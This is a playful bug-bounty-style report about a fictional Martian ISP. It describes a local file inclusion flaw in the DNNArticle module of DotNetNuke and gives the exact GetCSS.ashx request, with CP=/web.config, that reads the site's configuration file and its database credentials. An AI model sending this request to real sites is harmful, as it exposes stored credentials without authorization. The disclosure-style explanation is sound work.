# ISP from Mars - bug report
![ISP from Mars](https://media1.tenor.com/images/bbb7aeebfd93a357822cd6f0b0f4327f/tenor.gif?itemid=10668963)
##### Note: This is a totally imaginary internet service provider bug report. anything beyond that isn't true.
#
#
## Vulnerbility Details:
#### **Title:** Vulnerbility Exposure of Sensitive Information to an Unauthorized Actor
#### **Severity:** Critical
#### **Domain:** ISPfromMars.NotOM
#### **OVE-ID:** CVE-2018-9126
#
#
## Introduction:
``
This is a bug report on an imaginary multi-billion dollar ISP located in Mars under domain name of ISPfromMars.NotOM
A company responsible for providing aliens with 10G internet services. A really good ISP but it only needs hard workers that actually care about the aliens personal data and the company's own security.
``

`` 
After this report the company created a new concept to all  living beings, it helped them prevent vulnerabilities like this from falling into the wrong hands(black hat aliens). They called it BugBounty 🤐
``
#
## Vulnerbility description: 

``The vulnerbility can be described in simple words as a Local File Inclusion **LFI** vulnerbility.``
``The site ISPfromMars.NotOM runs the good old DotNetNuke framework which has been proven not to be the best choice in regards of frameworks to use.``

``DotNetNuke has desktopmodules just like how wordpress has plugins. One of the Modules used in ISPfromMars.NotOM was 'DNNArticle' this module can be used to get css files for example:``

- https://ISPfromMars.NotOM/desktopmodules/DNNArticle/GetCSS.ashx/?CP=/SomeCSSfile.css&smid=512&portalid=3 

#### How can this be exploited 🤔 ?

``An attacker can simply replace the css file with /web.config this will litrally Get the contents of the web.config file and provide it to the attacker. this attack would look like this: ``

- https://ISPfromMars.NotOM/desktopmodules/DNNArticle/GetCSS.ashx/?CP=/web.config&smid=512&portalid=3 
#### Web.config example output:
![](https://www.msdigest.net/wp-content/uploads/2016/06/image_thumb-1.png)

## Impact:
#### The attacker can get the contents of the web.config which contains sensitive database information such as :
> #####  - DataBase name
> ##### - DataBase passwords.
> #####  - DataBase usernames.
> #####  - and other extremely sensitive credentials.
#
#
#### simple attack ...
